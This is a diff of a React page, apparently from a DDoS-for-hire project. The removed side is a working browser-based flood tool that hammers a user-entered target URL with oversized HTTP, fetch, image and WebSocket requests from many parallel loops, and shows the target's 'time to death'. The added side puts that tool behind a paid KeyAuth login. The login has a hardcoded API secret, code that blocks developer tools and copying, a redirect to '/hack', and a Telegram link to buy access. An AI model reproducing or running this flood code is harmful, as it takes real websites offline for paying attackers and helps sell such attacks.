@@ -1,293 +1,227 @@
 "use client";
 
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 
-const NuclearAttackCommand = () => {
-  const [isAttacking, setIsAttacking] = useState(false);
-  const [strikeCount, setStrikeCount] = useState(0);
-  const [attackPower, setAttackPower] = useState(100);
-  const [targetUrl, setTargetUrl] = useState('');
-  const [health, setHealth] = useState(100);
-  const [ttd, setTtd] = useState(0);
-  const [radiation, setRadiation] = useState("0MB");
-  const [warningText, setWarningText] = useState('⚠️ WARNING: EXTREME POWER - TARGET WILL CRASH IN SECONDS ⚠️');
+export default function AdiatXPanel() {
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [statusText, setStatusText] = useState('⚡ STATUS: ARMED ⚡');
+  const [statusStyle, setStatusStyle] = useState({ color: '#ff8888', textShadow: '0 0 10px red' });
 
-  const attackIntervalRef = useRef<NodeJS.Timeout | null>(null);
-  const statsIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  // KeyAuth Config
+  const config = {
+    name: "ADIAT X PANEL",
+    ownerid: "OaREGqwvH6",
+    secret: "03ca68797371bf02b0274eb15c2f1dd03cef0acbb3dfc48c4b6f17366fb99d29",
+    version: "1.0"
+  };
 
-  // Security Protocols (Right click & Keyboard shortcuts)
   useEffect(() => {
+    // ---------- EXTREME ANTI TAMPER & DEBUG ----------
     const handleContextMenu = (e: MouseEvent) => e.preventDefault();
+    const handleSelectStart = (e: Event) => e.preventDefault();
+    const handleCopyCut = (e: ClipboardEvent) => e.preventDefault();
+
     const handleKeyDown = (e: KeyboardEvent) => {
+      // F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S
       if (
-        e.keyCode === 123 || 
-        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
-        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || 
-        (e.ctrlKey && e.keyCode === 85) || 
+        e.keyCode === 123 ||
+        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
+        (e.ctrlKey && e.keyCode === 85) ||
         (e.ctrlKey && e.keyCode === 83)
       ) {
         e.preventDefault();
-      }
-      if (e.key === 'Escape' && isAttacking) {
-        emergencyStop();
+        return false;
       }
     };
 
     document.addEventListener('contextmenu', handleContextMenu);
     document.addEventListener('keydown', handleKeyDown);
-    const consoleClear = setInterval(() => console.clear(), 100);
+    document.addEventListener('selectstart', handleSelectStart);
+    document.addEventListener('copy', handleCopyCut);
+    document.addEventListener('cut', handleCopyCut);
+
+    // DevTools Detection logic
+    const protectInterval = setInterval(() => {
+      const before = new Date().getTime();
+      console.log('');
+      const after = new Date().getTime();
+      if (after - before > 100) {
+        document.body.style.opacity = '0.8';
+      }
+    }, 800);
+
+    // Override console clear
+    const originalClear = console.clear;
+    console.clear = () => {
+      console.warn('[PROTECTED] Console cannot be cleared.');
+    };
 
     return () => {
       document.removeEventListener('contextmenu', handleContextMenu);
       document.removeEventListener('keydown', handleKeyDown);
-      clearInterval(consoleClear);
+      document.removeEventListener('selectstart', handleSelectStart);
+      document.removeEventListener('copy', handleCopyCut);
+      document.removeEventListener('cut', handleCopyCut);
+      clearInterval(protectInterval);
+      console.clear = originalClear;
     };
-  }, [isAttacking]);
+  }, []);
 
-  // Attack Functions
-  const nuclearHttpFlood = async (url: string) => {
-    for (let i = 0; i < 100; i++) {
-      try {
-        let xhr = new XMLHttpRequest();
-        xhr.open('GET', url + '?nuclear=' + Math.random() + '&' + 'X'.repeat(5000), true);
-        xhr.timeout = 1;
-        xhr.send();
-
-        fetch(url + '?atomic=' + Math.random(), {
-          mode: 'no-cors',
-          cache: 'no-store',
-          headers: { 'X-Nuclear': 'X'.repeat(10000) }
-        }).catch(() => {});
-
-        let img = new Image();
-        img.src = url + '/bomb_' + Math.random() + '?' + 'X'.repeat(2000);
-      } catch (e) {}
-    }
-    setStrikeCount(prev => prev + 100);
-  };
-
-  const atomTcpFlood = async (url: string) => {
-    for (let i = 0; i < 200; i++) {
-      try {
-        let xhr = new XMLHttpRequest();
-        xhr.open('GET', url + '?syn=' + Math.random(), true);
-        xhr.timeout = 1;
-        xhr.send();
-        
-        let ws = new WebSocket(url.replace('http', 'ws'));
-        setTimeout(() => ws.close(), 1);
-      } catch (e) {}
-    }
-    setStrikeCount(prev => prev + 200);
-  };
-
-  const hydrogenUdpFlood = async (url: string) => {
-    for (let i = 0; i < 500; i++) {
-      try {
-        fetch(url + '?udp=' + Math.random(), {
-          mode: 'no-cors',
-          body: 'X'.repeat(10000)
-        }).catch(() => {});
-
-        let xhr = new XMLHttpRequest();
-        xhr.open('POST', url + '?udp=' + Math.random(), true);
-        xhr.send('X'.repeat(10000));
-      } catch (e) {}
-    }
-    setStrikeCount(prev => prev + 500);
-  };
-
-  const superNovaAttack = async (url: string) => {
-    for (let i = 0; i < 1000; i++) {
-      try {
-        let xhr = new XMLHttpRequest();
-        xhr.open('GET', url + '?nova=' + Math.random() + '&' + 'X'.repeat(10000), true);
-        xhr.timeout = 1;
-        xhr.send();
-
-        fetch(url + '?super=' + Math.random(), {
-          mode: 'no-cors',
-          body: 'X'.repeat(50000)
-        }).catch(() => {});
-
-        let img = new Image();
-        img.src = url + '/nova_' + Math.random() + '?' + 'X'.repeat(10000);
-        
-        let ws = new WebSocket(url.replace('http', 'ws'));
-        ws.send('X'.repeat(10000));
-        setTimeout(() => ws.close(), 1);
-      } catch (e) {}
-    }
-    setStrikeCount(prev => prev + 1000);
-  };
-
-  const launchNuclearStrike = (url: string) => {
-    for (let i = 0; i < 50; i++) {
-      (async () => {
-        while (isAttacking) {
-          try {
-            if (attackPower === 100) await nuclearHttpFlood(url);
-            else if (attackPower === 200) await atomTcpFlood(url);
-            else if (attackPower === 300) await hydrogenUdpFlood(url);
-            else await superNovaAttack(url);
-            await new Promise(r => setTimeout(r, 0));
-          } catch (e) {
-            setStrikeCount(prev => prev + 1);
-          }
-        }
-      })();
-    }
-  };
-
-  useEffect(() => {
-    if (isAttacking) {
-      launchNuclearStrike(targetUrl);
-      
-      let warningCount = 0;
-      const warningInterval = setInterval(() => {
-        warningCount++;
-        setWarningText(`⚠️ NUCLEAR RADIATION: ${warningCount * 10}% ⚠️`);
-        if (strikeCount > 100000) {
-          setWarningText('💀 TARGET DESTROYED - MISSION COMPLETE 💀');
-        }
-      }, 500);
-
-      const statsInterval = setInterval(() => {
-        const rad = (strikeCount * 0.5).toFixed(0);
-        setRadiation(Number(rad) > 999 ? (Number(rad) / 1000).toFixed(1) + 'GB' : rad + 'MB');
-        
-        const currentHealth = Math.max(0, 100 - Math.floor(strikeCount / 1000));
-        setHealth(currentHealth);
-        setTtd(Math.max(0, Math.floor(currentHealth / 10)));
-      }, 100);
-
-      return () => {
-        clearInterval(warningInterval);
-        clearInterval(statsInterval);
-      };
-    }
-  }, [isAttacking]);
-
-  const handleFire = () => {
-    if (isAttacking) {
-      emergencyStop();
+  const login = async () => {
+    if (!username || !password) {
+      alert("⛔ ERROR: CREDENTIALS MISSING ⛔");
       return;
     }
-    if (!targetUrl.startsWith('http')) {
-      alert('ERROR: http:// or https:// দাও!');
-      return;
-    }
-    setIsAttacking(true);
-    setStrikeCount(0);
-  };
 
-  const emergencyStop = () => {
-    setIsAttacking(false);
-    window.stop();
+    setStatusText("🜁 CONNECTING TO SECURE NODE ...");
+    setStatusStyle({ color: "#ffaa00", textShadow: "0 0 15px orange" });
+
+    try {
+      // 1. INIT
+      const initUrl = `https://keyauth.win/api/1.2/?type=init&name=${encodeURIComponent(config.name)}&ownerid=${config.ownerid}&ver=${config.version}&_=${Date.now()}`;
+      const initRes = await fetch(initUrl, { cache: 'no-store' });
+      const initData = await initRes.json();
+
+      if (initData.success) {
+        setStatusText("🜂 AUTHENTICATING ...");
+        setStatusStyle({ color: "yellow", textShadow: "0 0 10px yellow" });
+
+        // 2. LOGIN
+        const logUrl = `https://keyauth.win/api/1.2/?type=login&username=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&sessionid=${initData.sessionid}&name=${encodeURIComponent(config.name)}&ownerid=${config.ownerid}&_=${Date.now()}`;
+        const logRes = await fetch(logUrl, { cache: 'no-store' });
+        const logData = await logRes.json();
+
+        if (logData.success) {
+          setStatusText("✔ ACCESS GRANTED! 核 REDIRECTING...");
+          setStatusStyle({ color: "#00ff88", textShadow: "0 0 20px lime" });
+          
+          localStorage.setItem("adiatSession", btoa("auth:" + Date.now()));
+
+          setTimeout(() => {
+            window.location.href = "/hack"; 
+          }, 1500);
+        } else {
+          setStatusText("✖ DENIED: " + (logData.message || "INVALID CREDENTIALS"));
+          setStatusStyle({ color: "#ff0000", textShadow: "0 0 20px red" });
+        }
+      } else {
+        setStatusText("✖ SERVER ERROR: " + (initData.message || "INIT FAIL"));
+        setStatusStyle({ color: "red", textShadow: "0 0 10px red" });
+      }
+    } catch (err) {
+      setStatusText("✖ NETWORK TIMEOUT / NODE OFFLINE");
+      setStatusStyle({ color: "#ff4444", textShadow: "0 0 10px red" });
+    }
   };
 
   return (
-    <div className="flex justify-center align-center h-screen bg-black overflow-hidden font-mono m-0 p-0 text-white select-none">
+    <div className="main-wrapper">
       <style dangerouslySetInnerHTML={{ __html: `
-        @keyframes nuclearPulse {
-          0% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); }
-          50% { border-color: #15ff00; box-shadow: 0 0 150px rgba(0, 255, 42, 0.9); }
-          100% { border-color: #ff0000; box-shadow: 0 0 100px rgba(255,0,0,0.7); }
+        .main-wrapper {
+          background: radial-gradient(circle at 20% 30%, #1a0000, #000000);
+          color: #ff0000;
+          font-family: 'Courier New', monospace;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          overflow: hidden;
+          position: relative;
         }
-        @keyframes nuclearText {
-          0% { opacity: 1; text-shadow: 0 0 30px red; }
-          50% { opacity: 0.9; text-shadow: 0 0 50px #ff6600; }
-          100% { opacity: 1; text-shadow: 0 0 30px red; }
+        .main-wrapper::before {
+          content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+          background: repeating-linear-gradient(0deg, rgba(255,0,0,0.03) 0px, rgba(0,0,0,0.5) 2px, transparent 3px);
+          pointer-events: none; z-index: 1;
         }
-        @keyframes warningBlink {
-          0% { opacity: 1; }
-          50% { opacity: 0.5; }
-          100% { opacity: 1; }
+        .login-card {
+          width: 420px; padding: 45px 40px; background: rgba(5, 0, 0, 0.85);
+          backdrop-filter: blur(4px); border: 2px solid #ff0000; border-radius: 24px;
+          text-align: center; z-index: 10; position: relative;
+          animation: borderPulse 2s infinite alternate;
         }
-        @keyframes nuclearButton {
-          0% { transform: scale(1); }
-          50% { transform: scale(1.05); box-shadow: 0 0 100px red; }
-          100% { transform: scale(1); }
+        @keyframes borderPulse {
+          0% { box-shadow: 0 0 30px #ff0000, 0 0 60px #8b0000 inset; border-color: #ff2222; }
+          100% { box-shadow: 0 0 70px #ff4444, 0 0 100px #ff0000 inset; border-color: #ff8888; }
         }
+        .glitch { font-size: 32px; font-weight: 900; animation: glitchText 1s infinite; }
+        @keyframes glitchText {
+          0%, 100% { transform: skew(0deg, 0deg); opacity: 1; }
+          95% { transform: skew(5deg, -2deg); opacity: 0.9; text-shadow: -4px 0 #ff4444, 3px 0 #aa0000; }
+          96% { transform: skew(-5deg, 3deg); text-shadow: 4px 0 darkred, -3px 0 red; }
+        }
+        .version-tag {
+          font-size: 11px; color: #822; letter-spacing: 3px; display: block;
+          margin-bottom: 30px; background: #0f0000; padding: 5px 0;
+          border-radius: 30px; border: 1px solid #330000; text-transform: uppercase;
+        }
+        input {
+          width: 100%; padding: 16px 20px; background: #0f0303; border: 2px solid #3a0000;
+          color: #fff; border-radius: 40px; text-align: center; margin-bottom: 25px; outline: none;
+          box-shadow: 0 0 5px #ff0000 inset; transition: 0.25s;
+        }
+        input:focus { border-color: #ff0000; box-shadow: 0 0 25px #ff0000, 0 0 15px #ff0000 inset; background: #1a0303; }
+        .btn-login {
+          width: 100%; padding: 18px; background: linear-gradient(145deg, #c80000, #4a0000);
+          color: white; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase;
+          border-radius: 60px; box-shadow: 0 0 30px #b30000, 0 5px 0 #2f0000; font-size: 18px;
+          letter-spacing: 4px; transition: 0.2s;
+        }
+        .btn-login:hover { background: linear-gradient(145deg, #ff1a1a, #8b0000); box-shadow: 0 0 60px red; letter-spacing: 6px; }
+        #status {
+          margin-top: 20px; font-size: 14px; font-weight: bold; min-height: 28px;
+          background: #0c0101; padding: 10px; border-radius: 40px; border: 1px solid #a00;
+        }
+        .btn-tg {
+          display: block; text-decoration: none; color: #00aaff; border: 2px solid #0088cc;
+          padding: 14px; border-radius: 50px; font-weight: bold; margin-top: 20px;
+          background: #001c22; box-shadow: 0 0 25px #0088cc; transition: 0.3s;
+        }
+        .btn-tg:hover { background: #0088cc; color: black; box-shadow: 0 0 60px #00ccff; transform: scale(1.02); }
+        .corner { position: absolute; width: 40px; height: 40px; border-color: red; border-style: solid; opacity: 0.7; }
+        .corner-tl { top: 10px; left: 10px; border-width: 3px 0 0 3px; }
+        .corner-tr { top: 10px; right: 10px; border-width: 3px 3px 0 0; }
+        .corner-bl { bottom: 10px; left: 10px; border-width: 0 0 3px 3px; }
+        .corner-br { bottom: 10px; right: 10px; border-width: 0 3px 3px 0; }
       `}} />
-      
-      <div className="control-panel self-center w-[1100px] bg-[#0f0000] border-4 p-[30px] rounded-[20px] relative" 
-           style={{ animation: 'nuclearPulse 0.5s infinite', borderColor: '#00f7ff' }}>
+
+      <div className="corner corner-tl"></div>
+      <div className="corner corner-tr"></div>
+      <div className="corner corner-bl"></div>
+      <div className="corner corner-br"></div>
+
+      <div className="login-card">
+        <h1 className="glitch">ADIAT X PANEL</h1>
+        <span className="version-tag">核・KEYAUTH EXTREME V2.0</span>
         
-        <div className="header text-center mb-5">
-          <h1 className="text-[48px] m-0" style={{ color: '#00f7ff', animation: 'nuclearText 0.3s infinite' }}>💀 NUCLEAR ATTACK MODE 💀</h1>
-          <div className="warning text-[#00ffd5] text-[20px] font-bold" style={{ animation: 'warningBlink 0.1s infinite' }}>
-            {warningText}
+        <input 
+          type="text" 
+          placeholder="❖  USERNAME  ❖" 
+          value={username}
+          onChange={(e) => setUsername(e.target.value)}
+          autoComplete="off"
+        />
+        <input 
+          type="password" 
+          placeholder="❖  PASSWORD  ❖" 
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          autoComplete="off"
+        />
+        
+        <button className="btn-login" onClick={login}>⏻ AUTHORIZE</button>
+        
+        <div id="status" style={statusStyle}>{statusText}</div>
+
+        <div style={{ marginTop: '30px', borderTop: '2px solid #3a0000', paddingTop: '20px' }}>
+          <a href="https://t.me/adiat990" target="_blank" rel="noopener noreferrer" className="btn-tg">
+            ⎔ BUY ACCESS / JOIN TG ⎔
+          </a>
+          <div style={{ fontSize: '8px', color: '#3a1a1a', marginTop: '16px', letterSpacing: '3px' }}>
+            ☢️ ADIAT NUCLEAR SYSTEMS • EXTREME EDITION ☢️
           </div>
-        </div>
-
-        <div className="input-group mb-5">
-          <label className="block mb-1">🎯 TARGET URL</label>
-          <input 
-            type="text" 
-            value={targetUrl} 
-            onChange={(e) => setTargetUrl(e.target.value)}
-            className="w-full p-[15px] bg-[#1a0000] border-2 border-[#660000] color-[#ff0000] text-[16px] font-bold outline-none"
-            style={{ color: '#ff0000' }}
-          />
-        </div>
-
-        <div className="attack-options grid grid-cols-4 gap-[15px] my-[25px]">
-          {[
-            { id: 100, title: '🔥 NUCLEAR HTTP', desc: '100,000 req/sec' },
-            { id: 200, title: '💀 ATOM TCP', desc: '200,000 packets/sec' },
-            { id: 300, title: '⚡ HYDROGEN UDP', desc: '500 MB/sec' },
-            { id: 500, title: '🌋 SUPER NOVA', desc: 'ALL MAXIMUM' }
-          ].map((option) => (
-            <div 
-              key={option.id}
-              onClick={() => setAttackPower(option.id)}
-              className={`attack-card p-[20px] text-center cursor-pointer border-2 transition-all ${attackPower === option.id ? 'selected border-[#ff0000] bg-[#330000]' : 'bg-[#1a0000] border-[#00e1ff]'}`}
-              style={attackPower === option.id ? { boxShadow: '0 0 50px red', border: '4px solid #ff0000' } : {}}
-            >
-              <h3 className="m-0 text-[18px]">{option.title}</h3>
-              <p className="m-0 mt-2 text-[14px]">{option.desc}</p>
-            </div>
-          ))}
-        </div>
-
-        <div className="stats-grid grid grid-cols-4 gap-[15px] my-[25px]">
-          {[
-            { label: 'NUCLEAR STRIKES', value: strikeCount.toLocaleString() },
-            { label: 'RADIATION MB/s', value: radiation },
-            { label: 'TARGET HEALTH', value: health <= 0 ? '0% 💀' : `${health}%` },
-            { label: 'TIME TO DEATH', value: health <= 0 ? 'DEAD' : `${ttd}s` }
-          ].map((stat, i) => (
-            <div key={i} className="stat-box bg-[#0f0000] border-2 border-[#660000] p-[20px] text-center">
-              <div className="text-[12px] text-gray-400 mb-1">{stat.label}</div>
-              <div className="stat-value text-[#ff0000] text-[40px] font-bold" style={{ textShadow: '0 0 20px red' }}>
-                {stat.value}
-              </div>
-            </div>
-          ))}
-        </div>
-
-        <button 
-          onClick={handleFire}
-          className="btn-nuclear w-full p-[30px] text-white text-[32px] font-bold border-none cursor-pointer my-[20px]"
-          style={{ 
-            background: 'linear-gradient(45deg, #660000, #ff0000)',
-            animation: isAttacking ? 'none' : 'nuclearButton 0.3s infinite'
-          }}
-        >
-          {isAttacking ? '💥 NUCLEAR STRIKE IN PROGRESS 💥' : '💣 LAUNCH NUCLEAR ATTACK 💣'}
-        </button>
-
-        <div 
-          style={{ textAlign: 'center', color: '#660000', cursor: 'pointer' }} 
-          onClick={emergencyStop}
-          className="uppercase font-bold hover:text-red-500"
-        >
-          ⚠️ EMERGENCY STOP ⚠️
         </div>
       </div>
     </div>
   );
-};
-
-export default NuclearAttackCommand;
+}
